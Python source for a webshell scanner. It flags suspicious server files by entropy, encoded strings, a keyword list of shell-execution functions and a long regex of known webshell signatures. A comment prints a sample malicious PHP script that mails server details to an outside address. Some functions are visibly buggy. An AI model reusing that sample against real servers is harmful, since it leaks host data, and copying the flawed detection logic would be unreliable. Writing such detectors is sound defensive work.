import base64
import configparser
import datetime
import getpass
import gzip
import hashlib
import json
import math
import os
import platform
import re
import socket
import sys
import threading
import time
import zipfile
from collections import Counter
from zipfile import ZipFile

import psutil
import requests
from smb.SMBConnection import SMBConnection

if platform.system() == "Linux":
    try:
        import termios
        import tty
    except ImportError:
        exit()


def PressAnyKey():
    if platform.system() == "Windows":
        os.system('pause')
    elif platform.system() == "Linux":
        print(getchr("Press any key to continue . . ."))


def getchr(prompt=''):
    sys.stdout.write(prompt)
    sys.stdout.flush()
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        return sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)


# TESTED AND WORKED
def GetAllFiles(dir_list, size, ext):
    i = 0
    for dir_path in dir_list:
        if os.path.isdir(dir_path):
            i = i + 1
    file_list = [[] for j in range(i)]
    i = 0
    for dir_path in dir_list:
        if os.path.isdir(dir_path):
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    file_size = os.path.getsize(root + "/" + file)
                    if file_size > size:
                        continue
                    if ext != "":
                        ext_list = ext.split("|")
                        for e in ext_list:
                            if e in file:
                                # append the file name to the list
                                file_list.append(os.path.join(root, file))
                                break
                    file_list[i].append(os.path.join(root, file))
        i = i + 1
    file_list_all = []
    if file_list == []:
        print("Wrong path input. Exit.")
        PressAnyKey()
        exit()
    for i in range(len(dir_list)):
        file_list_all = file_list_all + file_list[i]
    return file_list, file_list_all

# TESTED AND WORKED


def ScanExtension(file_name):
    # Input Sample
    # file_name = "Ajan.asp.txt"

    file_matches = {}
    r1 = re.compile("[^a-zA-Z0-9\-\_\.]{2,}")
    r2 = re.compile("\.[a-zA-Z0-9]{2,4}\.")
    r3 = re.compile(
        "\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs")
    matches = re.findall(r1, file_name)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    matches = re.findall(r2, file_name)
    if len(matches) > 0:
        for i in matches:
            matches_t = re.findall(r3, i)
            if len(matches_t) > 0:
                count_dict = dict(Counter(matches).items())
                file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def StringMatches(file_data):
    # Input Sample
    # file_data = "<?php include(\"config.php\");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename=\"linksbox_v2.sql\"');$ra44 = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98=\"john.barker446@gmail.com\";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65\";mail($sd98, $sj98, $msg8873, \"From: $sd98\"); header('Pragma: no-cache');header('Expires: 0'); $data .= \"#phpMyAdmin MySQL-Dump \r\n\"; $data .=\"# http://phpwizard.net/phpMyAdmin/ \r\n\"; $data .=\"# http://www.phpmyadmin.net/(download page) \r\n\"; $data .= \"#$database v2.0 Database Backup\r\n\"; $data .= \"#Host: $server\r\n\"; $data .= \"#Database: $database\r\n\r\n\"; $data .= \"#Table add_links:\r\n\";$result = mysql_query(\"SELECT * FROM add_links\");while($a = mysql_fetch_array($result)) { foreach($a as $key => $value) { $a[$key] = addslashes($a[$key]); } $data .= \"INSERT INTO add_links VALUES('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n\"; } echo $data; ?>"

    file_matches = {}
    r = re.compile(regex)
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def EntropyMatches(file_data):
    # Input Sample
    # file_h = open("test_entropy.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    entropy = 0.0
    if len(file_data) < 20*1024:
        return file_matches, 0
    file_data = file_data.replace(" ", "")
    for i in range(256):  # Scan all 256 character in ASCII
        count = float(file_data.count(chr(i)))
        length = float(len(file_data))
        pX = count / length
        if pX > 0.00:
            entropy = entropy + (-pX * math.log(pX, 2))
    if entropy > 7.4:
        file_matches["Entropy"] = int(entropy*10)
    return file_matches, entropy

# TESTED AND WORKED, BUT NOT SURE


def CompressMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    compressed = gzip.compress(bytes(file_data, 'utf-8'))
    raw = gzip.decompress(compressed)
    ratio = len(compressed) / len(raw)
    if ratio > 0.74:
        file_matches["Compress"] = int(ratio * 100)
    return file_matches

# TESTED, NEARLY CORRECT =)))


def SplitMatches(file_data):
    file_matches = {}
    s = "eval|file_put_contents|base64_decode|base64|python_eval|exec|passthru|popen|proc_open|pcntl|assert|system|shell|uncompress|cmd.exe|execute|escapeshellcmd|os.popen|/bin/sh|/bin/bash|create_function|executionpolicybypass"
    split_list = s.split("|")
    result = "|"
    for i in split_list:
        result = result + i[::-1] + "|"
    reg = s + result
    reg = reg.replace("_", "\_")
    reg = reg.replace(".", "\.")
    reg = reg.replace("/", "\/")
    r = re.compile(reg)
    r1 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r2 = re.compile(r"[^\w\/]")
    matches1 = re.findall(r1, file_data)
    s1 = ""
    if len(matches1) > 0:
        for i in matches1:
            s1 = s1 + i
    s1 = re.sub(pattern=r2, string=s1, repl="")
    matchesr1 = re.findall(r, s1.lower())
    if len(matchesr1) > 0:
        count_dict = dict(Counter(matchesr1).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def Base64Matches(file_data):
    # Correct Input Sample
    # file_h = open("test_base64.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile(r"[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile(
                "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    file_matches[it1] = len(it1)
    return file_matches

# TESTED AND WORKED


def Base32Matches(file_data):
    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile(r"[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile(
                "^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    file_matches[it1] = len(it1)
    return file_matches

# TESTED AND WORKED


def HexStringMatches(file_data):
    file_matches = {}
    r = re.compile(r"(?:(?:\\x[0-9A-Fa-f]{2})+)")
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def LongStringMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    r = re.compile("(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r1 = re.compile("[a-zA-Z0-9\+\/\=]")
    matches = re.findall(r, file_data)
    matches_result = []
    if len(matches) > 0:
        for it in matches:
            if len(it) < 64:
                continue
            matchesx = re.findall(r1, it)
            for x in matchesx:
                if len(x) == len(it)-2:
                    continue
            matches_result.append(it)
        count_dict = dict(Counter(matches_result).items())
        file_matches.update(count_dict)
    return file_matches


def CustomMatches(file_data, custom_matches):
    file_matches = {}
    if custom_matches == "":
        return file_matches
    r = [None] * len(custom_matches)
    for i in range(len(custom_matches)):
        try:
            r[i] = re.compile(custom_matches[i])
        except:
            print("Can't compile custom_rules.json")
            return file_matches
    for i in r:
        matches = re.findall(r[i], file_data)
        if len(matches) > 0:
            count_dict = dict(Counter(matches).items())
            file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def ProcessMatches(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    total_file_matches = {}
    file_matches = {}
    scan_info = ""
    count = 0

    try:
        file_handle = open(file)
    except:
        return total_file_matches, 0, "", 0

    file_size = os.stat(file).st_size
    file_name = os.path.basename(file)
    # Scan Extension
    file_matches = ScanExtension(file_name)

    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + "TRUE"
        count = count + 1
    scan_info = scan_info + ","
    try:
        file_data = file_handle.read()
    except:
        return total_file_matches, file_size, "", 0

    # CONFUSED HERE!!!!!!!!!!!
    # cmtR = "\/\/.*|\/\*.*?\*\/|[^\u0000-\u007f]+" # RANGE OF UNICODE IN PYTHON ONLY HAVE 1 \, NOT 2
    cmtR = "[^\u0000-\u007f]+"  # TEMPORARY REGEX.

    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl="")
    cmtR = re.compile("[\s\n\r\t]+")
    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl=" ")
    file_data = file_data.replace("  ", " ")
    file_data = file_data.replace(" (", "(")
    codeR = re.compile(
        r"<\?php(?:.*?)\?>|<script(?:.*?)<\/script>|<%(?:.*?)%>")
    matches = re.findall(pattern=codeR, string=file_data)
    if len(matches) > 0:
        file_data = ""
        for i in matches:
            file_data = file_data + i
    else:
        return total_file_matches, 0, "", 0

    # String Matches
    file_matches = StringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Entropy Matches and Calculate Entropy
    file_matches, entropy = EntropyMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Entropy": file_matches["Entropy"]})
        scan_info = scan_info + str(total_file_matches["Entropy"])
        count = count + 1
    scan_info = scan_info + ","

    # Compress Matches
    file_matches = CompressMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Compress": file_matches["Compress"]})
        scan_info = scan_info + str(total_file_matches["Compress"])
        count = count + 1
    scan_info = scan_info + ","

    # Split Matches
    file_matches = SplitMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base64 Matches
    file_matches = Base64Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base32 Matches
    file_matches = Base32Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Hex String Matches
    file_matches = HexStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Long String Matches
    file_matches = LongStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    # scan_info = scan_info + ","

    # Custom Matches
    # try:
    #     lock.acquire()
    #     custom_matches_handle = open("custom_rule.json", "r")
    #     custom_matches_string = custom_matches_handle.read()
    #     custom_matches = json.loads(custom_matches_string)
    #     custom_matches = custom_matches.get('rules')
    #     custom_matches_handle.close()
    #     lock.release()
    # except:
    #     custom_matches = ""
    # r = [None] * len(custom_matches)

    # if custom_matches_invalid == 0:
    #     for i in range(len(custom_matches)):
    #         try:
    #             r[i] = re.compile(custom_matches[i])
    #         except:
    #             lock.acquire()
    #             custom_matches_invalid = 1
    #             lock.release()
    #             break
    #     if custom_matches_invalid == 0:
    #         file_matches = CustomMatches(file_data, custom_matches)
    #         if len(file_matches) > 0:
    #             total_file_matches.update(file_matches)
    #             scan_info = scan_info + str(len(file_matches))
    #             count = count + 1

    match_log = file + "," + scan_info.replace(" ", "")
    if count > 0:
        return total_file_matches, file_size, match_log, entropy
    file_handle.close()
    return total_file_matches, file_size, "", entropy

# TESTED AND WORKED


def MD5HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.md5(file_data).hexdigest()
    return result


def SHA256HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.sha256(file_data).hexdigest()
    return result


def write_json(data, filename):
    with open(filename, 'w') as f:
        json.dump(data, f)


def ScanFunc(scan_dir, file_list_all, output_dir, start_time, lock):
    global matched
    global cleared
    global total

    # Scan file-by-file in file list
    for file in file_list_all:
        if file == None:
            continue
        # Sample
        # file = "C:\Users\namlh21\Downloads\WebShell_2\Php\devilzShell.php"

        file_name = os.path.basename(file)

        # Hash of file
        file_md5 = MD5HashFile(file)
        file_sha256 = SHA256HashFile(file)

        # Process Matches
        file_matches, size, match_log, entropy = ProcessMatches(file)

        # Process match_log: match_header = "PathName,Extension,String,Entropy,Compress,Split,Base64,Base32,HexString,LongString,Size,MD5,Created,Modified,Accessed\n"
        match_list = match_log.split(",")

        if len(match_list) != 10:
            match_list = [""] * 10

        # Scanned database
        lock.acquire(timeout=-1)
        db_handle = open("database.json", "r")
        db_content = db_handle.read()
        db_content_json = json.loads(db_content)
        db_handle.close()
        lock.release()
        for i in range(len(scan_dir)):
            if scan_dir[i] in file:
                total[i] = total[i] + 1
        if file_sha256 in str(db_content_json['blacklist']):
            print(file + ": Already in database. Matched.")
            lock.acquire()
            for i in range(len(scan_dir)):
                if scan_dir[i] in file:
                    matched[i] = matched[i] + 1
            lock.release()
            continue
        elif file_sha256 in str(db_content_json['whitelist']):
            print(file + ": Already in database. Clean.")
            lock.acquire()
            for i in range(len(scan_dir)):
                if scan_dir[i] in file:
                    cleared[i] = cleared[i] + 1
            lock.release()
            continue
        else:
            print(file)
            lock.acquire(timeout=-1)
            lock.release()
            if (len(file_matches) > 0 and size > 0):
                lock.acquire(timeout=-1)
                for i in range(len(scan_dir)):
                    if scan_dir[i] in file:
                        matched[i] = matched[i] + 1
                lock.release()

                lock.acquire(timeout=-1)
                db_handle = open("database.json", "r")
                db_json = json.load(db_handle)
                db_handle.close()
                blacklist = db_json['blacklist']
                blacklist.update({file_name: file_sha256})
                db_handle = open("database.json", "w")
                json.dump(db_json, db_handle)
                db_handle.close()
                lock.release()

            else:
                lock.acquire(timeout=-1)
                for i in range(len(scan_dir)):
                    if scan_dir[i] in file:
                        cleared[i] = cleared[i] + 1
                lock.release()

                lock.acquire(timeout=-1)
                db_handle = open("database.json", "r")
                db_json = json.load(db_handle)
                db_handle.close()
                whitelist = db_json['whitelist']
                whitelist.update({file_name: file_sha256})
                db_handle = open("database.json", "w")
                json.dump(db_json, db_handle)
                db_handle.close()
                lock.release()
                continue

        # Get created time
        if platform.system() == 'Windows':
            create_time = os.path.getctime(file)
            create_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = os.path.getmtime(file)
            modify_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = os.path.getatime(file)
            access_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))
        else:
            stat = os.stat(file)
            create_time = stat.st_ctime  # We're probably on Linux.
            create_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = stat.st_mtime
            modify_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = stat.st_atime
            access_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))

        # JSON output (ONLY MATCHED FILE INCLUDE ON LOG.JSON)
        json_data = {}
        json_data.update({"filePath": file})
        json_data.update({"size": str(size)})
        json_data.update({"md5": file_md5})
        json_data.update({"sha256": file_sha256})

        timestamps = {}
        timestamps.update({"created": create_time})
        timestamps.update({"modified": modify_time})
        timestamps.update({"accessed": access_time})
        json_data.update({"timestamps": timestamps})

        signature = {}
        signature.update({"extension": match_list[1]})
        signature.update({"string": match_list[2]})
        signature.update({"entropy": match_list[3]})
        signature.update({"compress": match_list[4]})
        signature.update({"split": match_list[5]})
        signature.update({"base64": match_list[6]})
        signature.update({"base32": match_list[7]})
        signature.update({"hexstring": match_list[8]})
        signature.update({"longstring": match_list[9]})
        json_data.update({"signature": signature})

        json_data.update({"matches": file_matches})
        json_data.update({"entropy": entropy})
        json_data_string = json.dumps(json_data)

        output_json_path = output_dir + "/log.json"
        lock.acquire(timeout=-1)
        output_json_handle = open(output_json_path, "a")
        output_json_handle.write(json_data_string + "\n")
        output_json_handle.close()
        lock.release()

    # Write scan debug info to debug.json
    stop_time = time.time()
    global total_scan_time
    total_scan_time = stop_time - start_time


def GetDebugInfo():
    global cpu_percent
    global mem_percent
    global mem_info

    pid = os.getpid()
    process = psutil.Process(pid)
    cpu_percent_l = [0] * 10
    mem_percent_l = [0] * 10
    mem_info_l = [0] * 10
    for i in range(10):
        cpu_percent_l[i] = process.cpu_percent(
            interval=0.5) / psutil.cpu_count()
        mem_percent_l[i] = process.memory_percent()
        mem_info_l[i] = process.memory_info()[0]/(1024*1024)
        time.sleep(1)
    cpu_percent = round(sum(cpu_percent_l) / len(cpu_percent_l), 6)
    mem_percent = round(sum(mem_percent_l) / len(mem_percent_l), 6)
    mem_info = round(sum(mem_info_l) / len(mem_info_l), 6)


def WriteDebugInfo(total, matched, cleared, scan_dir, scan_time, output_dir):
    global cpu_percent
    global mem_percent
    global mem_info

    hostname = socket.gethostname()
    user_name = getpass.getuser()
    homedir = os.path.expanduser("~")

    parser = configparser.ConfigParser()
    parser.read("config.conf")
    try:
        domain = parser.get("config", "domain")
    except:
        print("No option 'domain' in section: 'config'. Exit")
        PressAnyKey()
        exit()
    domain = domain.replace(" ", "")
    domain = domain.split(",")

    scan_data = {}
    scan_info = []
    for i in range(len(scan_dir)):
        scan_info.append({})
    directory = []
    for i in range(len(scan_dir)):
        directory.append({})
    for i in range(len(scan_info)):
        scan_info[i].update({"dirPath": str(scan_dir[i])})
        if len(domain) == len(scan_dir):
            scan_info[i].update({"domain": str(domain[i])})
        scan_info[i].update({"scanned": str(total[i])})
        scan_info[i].update({"matches": str(matched[i])})
        scan_info[i].update({"noMatches": str(cleared[i])})
    for i in range(len(directory)):
        scan_data.update({"dir" + str(i+1): scan_info[i]})
        # scan_data.update({"scanInfo": directory[i]})
    system_info = {}
    system_info.update({"cpuPercent": str(cpu_percent)})
    system_info.update({"memUsage": str(mem_info)})  # in KB
    system_info.update({"memPercent": str(mem_percent)})
    system_info.update({"hostname": str(hostname)})
    system_info.update({"username": user_name})
    system_info.update({"userHomeDir": homedir})
    scan_data.update({"systemInfo": system_info})

    scan_data.update({"scanDuration": str(scan_time)})
    scan_data_string = json.dumps(scan_data)
    output_json_path = output_dir + "/debug.json"
    output_json_handle = open(output_json_path, "a")
    output_json_handle.write(scan_data_string + "\n")
    output_json_handle.close()

# TESTED AND WORKED


def SplitList(lst, chunk_numbers):
    n = math.ceil(len(lst)/chunk_numbers)
    for x in range(0, len(lst), n):
        each_chunk = lst[x: n+x]
        if len(each_chunk) < n:
            each_chunk = each_chunk + [None for y in range(n-len(each_chunk))]
        yield each_chunk


def WindowsScheduler():
    try:
        import win32com.client
    except ImportError:
        print('Missing python modules. Exit')
        PressAnyKey()
        exit()

    # Get days_interval option
    parser = configparser.ConfigParser()
    parser.read("config.conf")
    try:
        days_interval = parser.get("config", "days_interval")
    except:
        print("No option 'days_interval' in section: 'config'. Exit")
        PressAnyKey()
        exit()

    # Check default config
    if days_interval == "":
        days_interval = 30  # run every 30 days

    # Check valid days_interval format
    if isinstance(days_interval, int) == False:
        print("[config] days_interval: is not in valid format. Exit")
        PressAnyKey()
        exit()

    # Connect to Schedule Service
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder("\\")
    task_def = scheduler.NewTask(0)

    # Create trigger
    start_time = datetime.datetime.now()
    TASK_TRIGGER_TIME = 1
    trigger = task_def.Triggers.Create(TASK_TRIGGER_TIME)
    trigger.StartBoundary = start_time.isoformat()
    repetitionPattern = trigger.Repetition
    repetitionPattern.Interval = "P" + str(days_interval) + "D"

    # Create action
    TASK_ACTION_EXEC = 0
    action = task_def.Actions.Create(TASK_ACTION_EXEC)
    action.ID = 'DO NOTHING'
    action.Path = tool_path + '\\calc.exe'
    # action.Path = 'calc.exe'

    # Set parameters
    task_def.RegistrationInfo.Description = 'Webshell Scan Task'
    task_def.Settings.Enabled = True

    # Register task
    # If task already exists, it will be updated
    TASK_CREATE_OR_UPDATE = 6
    TASK_LOGON_NONE = 0
    root_folder.RegisterTaskDefinition(
        'Webshell Scan Task',  # Task name
        task_def,
        TASK_CREATE_OR_UPDATE,
        '',  # No user
        '',  # No password
        TASK_LOGON_NONE)


def LinuxScheduler():
    try:
        import crontab
        from croniter import croniter
        from crontab import CronTab
    except ImportError:
        print('Missing python modules. Exit')
        PressAnyKey()
        exit()

    # Get crontab option
    parser = configparser.ConfigParser()
    parser.read("config.conf")
    try:
        crontab = parser.get("config", "crontab")
    except:
        print("No option 'crontab' in section: 'config'. Exit")
        PressAnyKey()
        exit()

    # Check default config
    if crontab == "":
        crontab = "0 0 1 * *"  # every first day of month

    # Check valid crontab
    valid = croniter.is_valid(crontab)
    if valid == False:
        print("[config] crontab: is not in valid format. Exit")
        PressAnyKey()
        exit()

    # Write crontab
    user_name = getpass.getuser()
    cron = CronTab(user=user_name)
    is_written = 0
    for job in cron:
        if job.comment == "webshell scan":
            job.setall(crontab)
            job.command = "python3 " + tool_path + "/webshell_scan.py"
            is_written = 1
            cron.write()
            break
    if is_written == 0:
        job = cron.new(command="python3 " + tool_path +
                       "/webshell_scan.py", comment="webshell scan")
        job.setall(crontab)
        cron.write()


def TestDatabase():
    try:
        db_path = parser.get("config", "database")
    except:
        print("No option 'database' in section: 'config'. Exit")
        PressAnyKey()
        exit()
    try:
        r = requests.get(db_path, allow_redirects=True)
        db_json_string = str(r.content())
        db_json = json.loads(db_json_string)
        blacklist = db_json["blacklist"]
        whitelist = db_json["whitelist"]
    except:  # If can't get web db, open or create local db
        try:
            print("Finding local database...")
            db_handle = open("database.json", "r")
            db_json_string = db_handle.read()
            db_json = json.loads(db_json_string)
            blacklist = db_json["blacklist"]
            whitelist = db_json["whitelist"]
            db_handle.close()
        except:
            print("Created new local database")
            db_handle = open("database.json", "a")
            # Define new json db
            db_json = {}
            blacklist = {}
            whitelist = {}
            db_json.update({"blacklist": blacklist})
            db_json.update({"whitelist": whitelist})
            db_json_string = json.dumps(db_json)
            db_handle.write(db_json_string)
            db_handle.close()


def SaveToLogServer():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    share_name = "Logs$"
    try:
        user_name = parser.get("auth", "user_name")
    except:
        print("No option 'user_name' in section: 'auth'. Exit")
        PressAnyKey()
        exit()
    try:
        password = parser.get("auth", "password")
    except:
        print("No option 'password' in section: 'auth'. Exit")
        PressAnyKey()
        exit()
    local_machine_name = socket.gethostbyaddr(local_ip)[0]
    server_machine_name = "s-dc1-azure-bk.vingroup.local"      # MUST match correctly
    server_IP = "10.111.177.41"        # as must this

    conn = SMBConnection(user_name, password, local_machine_name, server_machine_name,
                         is_direct_tcp=True, use_ntlm_v2=True, domain="VINGROUP")

    try:
        conn.connect(server_IP, port=445)
        zip_file = open(output_dir + "/" + output_zip, 'rb')
        conn.storeFile(share_name, "/" + output_zip, zip_file)
        zip_file.close()
        os.remove(output_dir + "/" + output_zip)
        print("Log .zip file saved in: smb://" +
              server_IP + "/" + share_name + "/" + output_zip)
    except:
        print("Log .zip file store in local.")

# ----------------------------------------------------------------------------------------------------------------------


# Global variables
total_scan_time = 0
cpu_percent = 0
mem_percent = 0
mem_info = 0
# custom_matches_inval = 0

# Main program
start_time = time.time()
print("Webshell Scan Program")


tool_path = os.getcwd()
# Open config file
try:
    config_handle = open("config.conf", "r")
except:
    print("Cannot find config file. Exit.")
    PressAnyKey()
    exit()

# Linux use crontab
if platform.system() == "Linux":
    LinuxScheduler()

# Windows use Task Scheduler
elif platform.system() == "Windows":
    WindowsScheduler()

else:
    print('Unsupported OS')
    PressAnyKey()
    exit()

parser = configparser.ConfigParser()
parser.read("config.conf")
try:
    scan_dir = parser.get("config", "dir")
except:
    print("No option 'dir' in section: 'config'. Exit")
    PressAnyKey()
    exit()
scan_dir = scan_dir.replace(" ", "")
scan_dir = scan_dir.split(",")
try:
    size = parser.get("config", "size")
except:
    print("No option 'size' in section: 'config'. Exit")
    PressAnyKey()
    exit()
try:
    ext = parser.get("config", "ext")
except:
    print("No option 'ext' in section: 'config'. Exit")
    PressAnyKey()
    exit()

if size == 0 or size == "":
    size = 10*1024*1024
else:
    size = int(size) * 1024 * 1024

# IMPORTANT!!! ALL REGEX ON THIS PROGRAM NEED TO USE NON-CAPTURING GROUP
regex = r"Filesman|(?:@\$_\[\]=|\$_=@\$_GET|\$_\[\+\"\"\]=)|eval\(\$(?:\w|\d)|Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|Html \= Replace\(Html\, \"\%26raquo\;\"\, \"?\"\)|pinkok|internal class reDuh|c0derz shell|md5 cracker|umer rock|Function CP\(S\,D\)\{sf\=CreateObject\(\"java\"\,\"java\.io\.File|Arguments\=xcmd\.text|asp cmd shell|Maceo|TEXTAREA id\=TEXTAREA1 name\=SqlQuery|CMD Bilgileri|sbusqlmod|php assert\(\$\_POST\[|oWshShellNet\.UserName|PHP C0nsole|rhtools|WinX Shell|system\(\$\_GET\[\'cmd\'|Successfully uploadet|\'Are you sure delete|sbusqlcmd|CFSWITCH EXPRESSION\=\#Form\.chopper|php\\HFile|\"ws\"\+\"cr\"\+\"ipt\.s\"\+\"hell\"|eval\(request\(|string rootkey|uZE Shell|Copyed success\!|InStr\(\"\$rar\$mdb\$zip\$exe\$com\$ico\$\"|Folder dosen\'t exists|Buradan Dosya Upload|echo passthru\(\$\_GET\[\'cmd\'|javascript:Bin\_PostBack|The file you want Downloadable|arguments\=\"/c \#cmd\#\"|cmdshell|AvFBP8k9CDlSP79lDl|AK-74 Security Team Web Shell|cfexecute name \= \"\#Form\.cmd\#\"|execute\(|Gamma Web Shell|System\.Reflection\.Assembly\.Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|fcreateshell|bash to execute a stack overflow|Safe Mode Shell|ASPX Shell|dingen\.php|azrailphp|\$\_POST\[\'sa\']\(\$\_POST\[\'sb\']\)|AspSpy|ntdaddy|\.HitU\. team|National Cracker Crew|eval\(base64\_decode\(\$\_REQUEST\[\'comment\'|Rootshell|geshi\\tsql\.php|tuifei\.asp|GRP WebShell|No Permission :\(|powered by zehir|will be delete all|WebFileManager Browsing|Dive Shell|diez\=server\.urlencode|@eval\(\$\_POST\[\'|ifupload\=\"ItsOk\"|eval\(request\.item|\(eval request\(|wsshn\.username|connect to reDuh|eval\(gzinflate\(base64\_decode|Ru24PostWebShell|ASPXTOOL\"|aspshell|File upload successfully you can download here|eval request\(|if\(is\_uploaded\_file\(\$HTTP|Sub RunSQLCMD|STNC WebShell|doosib|WinExec\(Target\_copy\_of\_cmd|php passthru\(getenv|win\.com cmd\.exe /c cacls\.exe|TUM HAKLARI SAKLIDIR|Created by PowerDream|Then Request\.Files\(0\)\.SaveAs\(Server\.MapPath\(Request|cfmshell|\{ Request\.Files\[0]\.SaveAs\(Server\.MapPath\(Request|\%execute\(request\(\"|php eval\(\$\_POST\[|lama\'s\'hell|RHTOOLS|data\=request\(\"dama\"|digitalapocalypse|hackingway\.tk|\.htaccess stealth web shell|strDat\.IndexOf\(\"EXEC \"|ExecuteGlobal request\(|Deleted file have finished|bin\_filern|CurrentVersionRunBackdoor|Chr\(124\)\.O\.Chr\(124\)|does not have permission to execute CMD\.EXE|G-Security Webshell|system\( \"\./findsock|configwizard|textarea style\=\"width:600\;height:200\" name\=\"cmd\"|ASPShell|repair/sam|BypasS Command eXecute|\%execute\(request\(|arguments\=\"/c \#hotmail|Coded by Loader|Call oS\.Run\(\"win\.com cmd\.exe|DESERTSUN SERVER CRASHER|ASPXSpy|cfparam name\=\"form\.shellpath\"|IIS Spy Using ADSI|p4ssw0rD|WARNING: Failed to 